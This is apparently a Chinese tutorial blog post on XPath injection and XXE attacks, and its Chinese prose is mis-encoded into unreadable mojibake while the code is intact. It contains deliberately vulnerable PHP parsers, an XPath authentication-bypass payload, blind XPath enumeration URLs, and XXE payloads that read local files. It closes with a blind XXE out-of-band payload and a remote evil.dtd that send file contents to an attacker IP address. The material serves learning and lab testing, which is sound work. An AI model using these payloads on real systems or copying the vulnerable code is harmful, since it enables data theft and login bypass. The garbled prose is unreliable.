ï¼Œä»¥è·å¾—æƒé™ä¿¡æ¯çš„è®¿é—®æƒå¹¶æ›´æ”¹è¿™äº›ä¿¡æ¯ã€‚XPathæ³¨å…¥æ”»å‡»æ˜¯é’ˆå¯¹WebæœåŠ¡åº”ç”¨æ–°çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨äº‹å…ˆä¸çŸ¥é“XPathæŸ¥è¯¢ç›¸å…³çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡XPathæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªXMLæ–‡æ¡£çš„å®Œæ•´å†…å®¹ã€‚</p><p>XPathæ³¨å…¥å‘ç”Ÿåœ¨å½“ç«™ç‚¹ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯æ¥æ„é€ è¯·æ±‚ä»¥è·å–XMLæ•°æ®ã€‚æ”»å‡»è€…å¯¹ç«™ç‚¹å‘é€ç»è¿‡ç‰¹æ®Šæ„é€ çš„ä¿¡æ¯æ¥æ¢ç©¶ç«™ç‚¹ä½¿ç”¨çš„XMLæ˜¯å¦‚ä½•æ„é€ çš„ï¼Œä»è€Œè¿›ä¸€æ­¥è·å–æ­£å¸¸é€”å¾„ä¸‹æ— æ³•è·å–çš„æ•°æ®ã€‚å½“XMLæ•°æ®è¢«ç”¨ä½œè´¦æˆ·éªŒè¯æ—¶ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æå‡ä»–çš„æƒé™ã€‚</p><p><strong>Xpathæ”»å‡»ç‰¹ç‚¹</strong></p><p>XPathæ³¨å…¥æ”»å‡»åˆ©ç”¨ä¸¤ç§æŠ€æœ¯ï¼Œå³<strong>XPathæ‰«æ</strong>å’Œ <strong>XPathæŸ¥è¯¢å¸ƒå°”åŒ–</strong>ã€‚é€šè¿‡è¯¥æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æ¥è¿›è¡ŒXPathæŸ¥è¯¢çš„XMLæ•°æ®åº“ã€‚è¿™ç§æ”»å‡»å¯ä»¥æœ‰æ•ˆåœ°å¯¹ä»˜ä½¿ç”¨XPathæŸ¥è¯¢ï¼ˆå’ŒXMLæ•°æ®åº“ï¼‰ æ¥æ‰§è¡Œèº«ä»½éªŒè¯ã€æŸ¥æ‰¾æˆ–è€…å…¶å®ƒæ“ä½œã€‚</p><p>XPathæ³¨å…¥æ”»å‡»åŒSQLæ³¨å…¥æ”»å‡»ç±»ä¼¼ï¼Œä½†ä¸SQLæ³¨å…¥ç›¸æ¯”ï¼ŒXPathå…·æœ‰çš„ä¼˜åŠ¿ï¼š</p><ol><li>å¹¿æ³›æ€§<br> åªè¦æ˜¯åˆ©ç”¨XPathè¯­æ³•çš„Web åº”ç”¨ç¨‹åºè‹¥æœªå¯¹è¾“å…¥çš„XPathæŸ¥è¯¢åšä¸¥æ ¼çš„å¤„ç†éƒ½ä¼šå­˜åœ¨XPathæ³¨å…¥æ¼æ´ã€‚è€Œåœ¨SQLæ³¨å…¥æ”»å‡»è¿‡ç¨‹ä¸­æ ¹æ®æ•°æ®åº“æ”¯æŒçš„SQLè¯­è¨€ä¸åŒï¼Œæ³¨å…¥æ”»å‡»çš„å®ç°å¯èƒ½ä¸åŒã€‚</li><li>å±å®³æ€§å¤§<br> XPathè¯­è¨€å‡ ä¹å¯ä»¥æ²¡æœ‰è®¿é—®æ§åˆ¶é™åˆ¶çš„å¼•ç”¨XMLæ–‡æ¡£çš„æ‰€æœ‰éƒ¨åˆ†ã€‚è€Œåœ¨SQLæ³¨å…¥ä¸­ï¼Œä¸€ä¸ªâ€œ<code>ç”¨æˆ·</code>â€çš„æƒé™å¯èƒ½è¢«é™åˆ¶åˆ° æŸä¸€ç‰¹å®šçš„è¡¨ã€åˆ—æˆ–è€…æŸ¥è¯¢ã€‚<br> XPathæ³¨å…¥æ”»å‡»å¯ä»¥ä¿è¯å¾—åˆ°å®Œæ•´çš„XMLæ–‡æ¡£ï¼Œå³å®Œæ•´çš„æ•°æ®åº“ã€‚åªè¦WebæœåŠ¡åº”ç”¨å…·æœ‰åŸºæœ¬çš„å®‰å…¨æ¼æ´ï¼Œå³å¯æ„é€ é’ˆå¯¹ XPathåº”ç”¨çš„è‡ªåŠ¨æ”»å‡»ã€‚</li></ol><p><strong>XPathæ³¨å…¥æ”»å‡»åŸç†ä¸åº”ç”¨</strong></p><p>XPathæ³¨å…¥æ”»å‡»ä¸»è¦æ˜¯é€šè¿‡æ„å»ºç‰¹æ®Šçš„è¾“å…¥ï¼Œè¿™äº›è¾“å…¥å¾€å¾€æ˜¯XPathè¯­æ³•ä¸­çš„ä¸€äº›ç»„åˆï¼Œè¿™äº›è¾“å…¥å°†ä½œä¸ºå‚æ•°ä¼ å…¥Web åº”ç”¨ç¨‹åºï¼Œé€šè¿‡æ‰§è¡ŒXPathæŸ¥è¯¢è€Œæ‰§è¡Œå…¥ä¾µè€…æƒ³è¦çš„æ“ä½œã€‚<br> æ³¨å…¥å¯¹è±¡ä¸æ˜¯æ•°æ®åº“usersè¡¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„XMLæ–‡ä»¶ã€‚å› ä¸ºxpathä¸å­˜åœ¨è®¿é—®æ§åˆ¶ï¼Œæ‰€ä»¥ä¸ä¼šé‡åˆ°è®¸å¤šåœ¨SQLæ³¨å…¥ä¸­ç»å¸¸é‡åˆ°çš„è®¿é—®é™åˆ¶ã€‚ æ³¨å…¥å‡ºç°çš„ä½ç½®ä¹Ÿå°±æ˜¯<code>cookie</code>ï¼Œ<code>headers</code>ï¼Œ<code>request</code> <code>parameters/input</code>ç­‰ã€‚</p><p> é¦–å…ˆè¦å»äº†è§£xPathåŸºç¡€è¯­æ³•â€”â€“&gt;  <a href="https://www.freebuf.com/column/211251.html">xPathæ³¨å…¥å­¦ä¹ ä¹‹åŸºç¡€è¯­æ³•å­¦ä¹ </a></p><p>å¦‚æœä¸€ä¸ªç½‘ç«™æŸåº”ç”¨ç¨‹åºå°†æ•°æ®ä¿å­˜åœ¨XMLä¸­ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšé™åˆ¶ï¼Œæ”»å‡»è€…æäº¤äº†æ²¡æœ‰ç»è¿‡å¤„ç†çš„è¾“å…¥ï¼Œå°±æ’å…¥åˆ° XPath æŸ¥è¯¢ä¸­ï¼Œå³äº§ç”ŸXpathæ³¨å…¥ï¼Œé‚£ä¹ˆå°±æ”»å‡»è€…å°±å¯èƒ½é€šè¿‡æ§åˆ¶æŸ¥è¯¢ï¼Œè·å–æ•°æ®ï¼Œæˆ–è€…åˆ é™¤æ•°æ®ä¹‹ç±»çš„æ“ä½œã€‚</p><p>Xpathæ˜¯xmlè·¯å¾„è¯­è¨€ï¼Œç”¨äºé…ç½®æ–‡ä»¶çš„æŸ¥æ‰¾ã€‚æ•°æ®åº“å°±æ˜¯xmlæ–‡ä»¶ã€‚å› æ­¤åªè¦æ˜¯åˆ©ç”¨XPathè¯­æ³•çš„Web åº”ç”¨ç¨‹åºå¦‚æœæœªå¯¹è¾“å…¥çš„XPathæŸ¥è¯¢åšä¸¥æ ¼çš„å¤„ç†éƒ½ä¼šå­˜åœ¨XPathæ³¨å…¥æ¼æ´ã€‚æ¯”å¦‚ä¸€äº›ç™»å½•åœ°å€é¡µé¢ï¼Œæœç´¢é¡µé¢éœ€è¦ä¸xmläº¤äº’çš„ä½ç½®ã€‚</p><p><strong>XPathç›´æ¥æ³¨å…¥</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;    &lt;users&gt;         &lt;user&gt;             &lt;id&gt;1&lt;/id&gt;            &lt;username&gt;test1&lt;/username&gt;            &lt;password&gt;test1&lt;/password&gt;        &lt;/user&gt;         &lt;user&gt;             &lt;id&gt;2&lt;/id&gt;            &lt;username&gt;test2&lt;/username&gt;            &lt;password&gt;test2&lt;/password&gt;        &lt;/user&gt;    &lt;/users&gt;&lt;/root&gt;</code></pre><p>test.php(ç”¨äºæ¥å—ä¼ å…¥å‚æ•°ï¼Œå¹¶è¿›è¡ŒxmlæŸ¥è¯¢)</p><pre><code class="php">&lt;?php$xml=simplexml_load_file(&#39;test.xml&#39;);$name=$_GET[&#39;name&#39;];$pwd=$_GET[&#39;pwd&#39;];$query=&quot;/root/users/user[username/text()=&#39;&quot;.$name.&quot;&#39; and password/text()=&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result=$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;/h2&gt;&#39;;    foreach($result as $key=&gt;$value)&#123;        echo &#39;&lt;br /&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br /&gt;Username:&#39;.$value-&gt;username;        echo &#39;&lt;br /&gt;Password:&#39;.$value-&gt;password;    &#125;&#125;?&gt;</code></pre><p><strong><a href="http://www.w3school.com.cn/php/func_simplexml_load_file.asp"><code>simplexml_load_file()</code>å‡½æ•°</a></strong><br> è¿”å›ç±» SimpleXMLElement çš„ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„å±æ€§åŒ…å« XML æ–‡æ¡£ä¸­çš„æ•°æ®</p><p>æˆ‘ä»¬å…ˆä¼ å…¥æ­£å¸¸å‚æ•°</p><pre><code>http://127.0.0.1/test.php?name=test1&amp;pwd=test1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230048387.png" alt="image-20220421230048387"></p><p>æˆåŠŸè¿”å›äº†æˆ‘ä»¬éœ€è¦çš„å€¼</p><p>å¦‚æœæˆ‘ä»¬åœ¨usernameä¸­è¾“å…¥æ¶æ„çš„å€¼ï¼Œæ¯”å¦‚</p><pre><code>&#39; or 1=1 or &#39;&#39; = &#39;</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬çš„XPathæŸ¥è¯¢è¯­å¥å°±å˜ä¸º</p><pre><code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39; = &#39;&#39; and password/text()=&#39;test1&#39;] #andçš„ä¼˜å…ˆçº§é«˜äºor</code></pre><p>æˆ‘ä»¬çœ‹å‡ºç°äº†ä»€ä¹ˆæƒ…å†µ</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230408461.png" alt="image-20220421230408461"></p><p>è¿™ä¸ªè¯­å¥å¯¼è‡´äº†ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯æ‰€æœ‰çš„userå…ƒç´ éƒ½æ»¡è¶³è¦æ±‚</p><p>ä¸Šé¢è¿™ä¸ªå­—ç¬¦ä¸²ä¼šåœ¨é€»è¾‘ä¸Šä½¿æŸ¥è¯¢ä¸€ç›´è¿”å› trueï¼Œå¹¶å°†ä¸€ç›´å…è®¸æ”»å‡»è€…è®¿é—®ç³»ç»Ÿ</p><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ XPath åœ¨åº”ç”¨ç¨‹åºä¸­åŠ¨æ€åœ°æ“ä½œ XML æ–‡æ¡£ã€‚æ”»å‡»å®Œæˆç™»å½•å¯ä»¥å†é€šè¿‡XPathç›²æ³¨æŠ€æœ¯è·å–æœ€é«˜æƒé™å¸å·å’Œå…¶å®ƒé‡è¦æ–‡æ¡£ä¿¡æ¯ã€‚</p><p><strong>XPathç›²æ³¨</strong></p><p>å¦‚æœæƒ³è¦æ„é€ æ¶æ„è¯­å¥éå†å‡ºæ•´ä¸ªXMLæ–‡æ¡£ï¼Œä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1.ç›²æ³¨æ ¹èŠ‚ç‚¹</p><p>åˆ©ç”¨countï¼ˆ/*ï¼‰åˆ¤æ–­æ ¹ä¸‹èŠ‚ç‚¹ï¼š</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421233640335.png" alt="image-20220421233640335"></p><p>è¿™æ¡è¯­å¥çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ¥åˆ¨æä¸‹</p><pre><code>/root/users/user[username/text()=&#39;&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>å¯¹äºè¿™ä¸ªXPathè¯­å¥ï¼Œé¦–å…ˆæ‰§è¡Œandè¯­å¥</p><pre><code>&#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>è¿™æ¡æ’ä¸ºå‡</p><p>ç„¶å</p><pre><code>username/text()=&#39;&#39; or count(/*) = 1</code></pre><p>è¿™æ¡åœ¨æ ¹èŠ‚ç‚¹ä¸º1çš„æ—¶å€™ä¸ºçœŸï¼Œä¸æ˜¯1å°±ä¸ºå‡</p><p>ç„¶åç®€åŒ–ä¸€ä¸‹</p><pre><code>çœŸ/å‡ or å‡</code></pre><p>æˆ‘ä»¬å‘ç°ï¼Œåˆ¤æ–­è¿™æ¡è¯­å¥æ˜¯å¦ä¸ºçœŸçš„å…³é”®ç‚¹æ˜¯</p><pre><code>count(/*) = 1</code></pre><p>å½“æ ¹èŠ‚ç‚¹ä¸º1æ—¶ï¼Œå°±å¯ä»¥é€‰å‡ºæ‰€ä»¥userå…ƒç´ ï¼Œä¸æ˜¯1æ—¶ï¼Œå°±æ— æ³•é€‰å‡ºï¼Œç”±æ­¤å°±å¯ä»¥åˆ¤æ–­æ ¹èŠ‚ç‚¹ä¸ªæ•°</p><p>ä»…ä»…åˆ¤æ–­äº†ä¸ªæ•°æ˜¯ä¸å¤Ÿçš„ï¼Œè¿˜è¦çŸ¥é“å®ƒæ˜¯ä»€ä¹ˆå­—ç¬¦æ‰å¯ä»¥ï¼Œå¯ä»¥ä½¿ç”¨substringåˆ†å‰²æ ¹èŠ‚ç‚¹çš„æ¯ä¸ªå­—ç¬¦ï¼ŒçŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421234716211.png" alt="image-20220421234716211"></p><p>æ ¹æ®è¿™æ ·çš„åŸç†å†™ä¸€ä¸ªè„šæœ¬å°±okäº†</p><p>2.ç›²æ³¨rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹</p><p>åˆ¤æ–­rootæ˜¯å¦æœ‰ä¸‹ä¸€çº§(1ä¸ª)èŠ‚ç‚¹</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/root/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p>åŒç†çŒœè§£rootä¸‹ä¸€çº§èŠ‚ç‚¹</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),2,1)=&#39;s&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421235135999.png" alt="image-20220421235135999"></p><p>ä¸€ç›´æŒ‰ç…§è¿™æ ·çš„æ­¥éª¤å¾€ä¸‹å³å¯</p><p><strong>XPathæ³¨å…¥å±å®³</strong></p><ul><li>åœ¨URLåŠè¡¨å•ä¸­æäº¤æ¶æ„XPathä»£ç ï¼Œå¯è·å–åˆ°æƒé™é™åˆ¶æ•°æ®çš„è®¿é—®æƒï¼Œå¹¶å¯ä¿®æ”¹è¿™äº›æ•°æ®ã€‚</li><li>å¯é€šè¿‡æ­¤ç±»æ¼æ´æŸ¥è¯¢è·å–åˆ°ç³»ç»Ÿå†…éƒ¨å®Œæ•´çš„XMLæ–‡æ¡£å†…å®¹ã€‚</li><li>é€»è¾‘ä»¥åŠè®¤è¯è¢«ç»•è¿‡ï¼Œå®ƒä¸åƒæ•°æ®åº“é‚£æ ·æœ‰å„ç§æƒé™ï¼Œxmlæ²¡æœ‰å„ç§æƒé™çš„æ¦‚å¿µ,æ­£å› ä¸ºæ²¡æœ‰æƒé™æ¦‚å¿µï¼Œå› æ­¤åˆ©ç”¨xpathæ„é€ æŸ¥è¯¢çš„æ—¶å€™æ•´ä¸ªæ•°æ®åº“éƒ½ä¼šè¢«ç”¨æˆ·è¯»å–ã€‚</li></ul><p><strong>XPathæ³¨å…¥é˜²å¾¡</strong></p><ol><li>æ•°æ®æäº¤åˆ°æœåŠ¡å™¨ä¸Šç«¯ï¼Œåœ¨æœåŠ¡ç«¯æ­£å¼å¤„ç†è¿™æ‰¹æ•°æ®ä¹‹å‰ï¼Œå¯¹æäº¤æ•°æ®çš„åˆæ³•æ€§è¿›è¡ŒéªŒè¯ã€‚</li><li>æ£€æŸ¥æäº¤çš„æ•°æ®æ˜¯å¦åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç è½¬æ¢æˆ–æ›¿æ¢ã€åˆ é™¤æ•æ„Ÿå­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚</li><li>å¯¹äºç³»ç»Ÿå‡ºç°çš„é”™è¯¯ä¿¡æ¯ï¼Œä»¥IEé”™è¯¯ç¼–ç ä¿¡æ¯æ›¿æ¢ï¼Œå±è”½ç³»ç»Ÿæœ¬èº«çš„å‡ºé”™ä¿¡æ¯ã€‚</li><li>å‚æ•°åŒ–XPathæŸ¥è¯¢ï¼Œå°†éœ€è¦æ„å»ºçš„XPathæŸ¥è¯¢è¡¨è¾¾å¼ï¼Œä»¥å˜é‡çš„å½¢å¼è¡¨ç¤ºï¼Œå˜é‡ä¸æ˜¯å¯ä»¥æ‰§è¡Œçš„è„šæœ¬ã€‚</li><li>é€šè¿‡MD5ã€SSLç­‰åŠ å¯†ç®—æ³•ï¼Œå¯¹äºæ•°æ®æ•æ„Ÿä¿¡æ¯å’Œåœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­åŠ å¯†ï¼Œå³ä½¿æŸäº›éæ³•ç”¨æˆ·é€šè¿‡éæ³•æ‰‹æ³•è·å–æ•°æ®åŒ…ï¼Œçœ‹åˆ°çš„ä¹Ÿæ˜¯åŠ å¯†åçš„ä¿¡æ¯ã€‚ æ€»ç»“ä¸‹å°±æ˜¯ï¼šé™åˆ¶æäº¤éæ³•å­—ç¬¦ï¼Œå¯¹è¾“å…¥å†…å®¹ä¸¥æ ¼æ£€æŸ¥è¿‡æ»¤ï¼Œå‚æ•°åŒ–XPathæŸ¥è¯¢çš„å˜é‡ã€‚</li></ol><h1 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)</h1><p><strong>XXEæ¼æ´ç®€ä»‹</strong></p><p>XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br> XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆ<strong>ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»</strong>ç­‰å±å®³ã€‚<br> XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p><p>è§£æxmlåœ¨phpåº“libxmlï¼Œlibxml&gt;=2.9.0çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰XXEæ¼æ´ã€‚<br> <a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>å¯ä»¥è¯»å–XML</p><p><strong>æœ¬åœ°ç¯å¢ƒæ­å»º</strong></p><p>test.php</p><pre><code class="php">&lt;?php$xmlfile=file_get_contents(&#39;php://input&#39;);$dom=new DOMDocument();$dom-&gt;loadXML($xmlfile);$xml=simplexml_import_dom($dom);$xxe=$xml-&gt;xxe;$str=&quot;$xxe \n&quot;;echo $str;?&gt;</code></pre><ul><li><code>file_get_contents</code>è·å–å®¢æˆ·ç«¯è¾“å…¥å†…å®¹</li><li><code>new DOMDocument()</code>åˆå§‹åŒ–XMLè§£æå™¨</li><li><code>loadXML($xmlfile)</code>åŠ è½½å®¢æˆ·ç«¯è¾“å…¥çš„XMLå†…å®¹</li><li><code>simplexml_import_dom($dom)</code>è·å–XMLæ–‡æ¡£èŠ‚ç‚¹ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›SimpleXMLElementå¯¹è±¡ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›FALSEã€‚</li><li>è·å–SimpleXMLElementå¯¹è±¡ä¸­çš„èŠ‚ç‚¹XXEï¼Œç„¶åè¾“å‡ºXXEå†…å®¹ã€‚</li></ul><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&lt;/xml&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003257935.png" alt="image-20220422003257935"></p><p>æˆåŠŸè¯»å–äº†æˆ‘eç›˜çš„æ–‡ä»¶</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003239790.png" alt="image-20220422003239790"></p><p><strong>XXEå¸¸è§åˆ©ç”¨æ–¹å¼</strong></p><p>ä¸SQLç›¸ä¼¼ï¼ŒXXEæ¼æ´ä¹Ÿåˆ†ä¸ºæœ‰å›æ˜¾å’Œæ— å›æ˜¾<br> æœ‰å›æ˜¾ï¼Œå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ã€‚<br> æ— å›æ˜¾ï¼Œåˆç§°ä¸ºblind xxeï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®(OOB)é€šé“æå–æ•°æ®ã€‚å³å¯ä»¥å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„XMLæ–‡ä»¶è¯»å–æ–‡ä»¶ã€‚</p><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a><strong>ä»»æ„æ–‡ä»¶è¯»å–</strong></h2><p><strong>æˆ‘ä»¬åœ¨è¿™é‡Œé‡‡ç”¨ä¸€ä¸ªé¶åœºæ¥åˆ†æ</strong></p><p><a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a></p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422004849510.png" alt="image-20220422004849510" style="zoom:67%;"><p>é¶åœºæºç :</p><pre><code class="php">&lt;?php$USERNAME = &#39;admin&#39;; //è´¦å·$PASSWORD = &#39;admin&#39;; //å¯†ç $result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    &#125;else&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    &#125;   &#125;catch(Exception $e)&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p><strong>æœ‰å›æ˜¾</strong></p><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005656974.png" alt="image-20220422005656974"></p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>php://filter</code>åè®®è¯»å–qwzf.txtæ–‡ä»¶å†…å®¹(ä¹Ÿå¯ä»¥è¯»å–å…¶ä»–ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚ï¼šphpæ–‡ä»¶)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005948762.png" alt="image-20220422005948762"></p><p><strong>æ— å›æ˜¾</strong></p><p>æ— å›æ˜¾çš„è¯ï¼Œå°±ä¼šéº»çƒ¦è®¸å¤š</p><p>æˆ‘ä»¬å…ˆä¿®æ”¹æºç ï¼Œç¦æ‰è¾“å‡ºä»£ç å’ŒæŠ¥é”™ä¿¡æ¯ï¼Œæ”¹æˆæ— å›æ˜¾ã€‚</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010158422.png" alt="image-20220422010158422"></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010234624.png" alt="image-20220422010234624"></p><p>é‡åˆ°æ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡<code>Blind XXE</code>æ–¹æ³•åŠ ä¸Šå¤–å¸¦æ•°æ®é€šé“æ¥æå–æ•°æ®ï¼Œå…ˆä½¿ç”¨<code>php://filter</code>åè®®è·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥<code>http</code>è¯·æ±‚å‘é€åˆ°æ”»å‡»æœåŠ¡å™¨æ¥è¯»å–æ•°æ®ã€‚è™½æ— æ³•ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†ï¼Œåœ¨å¤–éƒ¨ç½‘ç»œä¸Šæ‰§è¡Œæ‰«æä»¥åŠä»£ç ã€‚å³ï¼Œå½“æ— å›æ˜¾æƒ…å†µæ—¶ï¼Œå¯ä»¥å°†æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)ã€‚</p><p>è¿™é‡Œæˆ‘çš„æœåŠ¡å™¨ipä¸º:39.105.71.63</p><p>æ„é€ payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=E:/phpstudy_pro/WWW/flag.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://39.105.71.63:66/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>è¿œç¨‹æœåŠ¡å™¨éƒ¨ç½²evil.dtdå†…å®¹ä¸º:</p><pre><code class="xml">&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25;   send SYSTEM &#39;http://39.105.71.63:66/?%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>å†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç 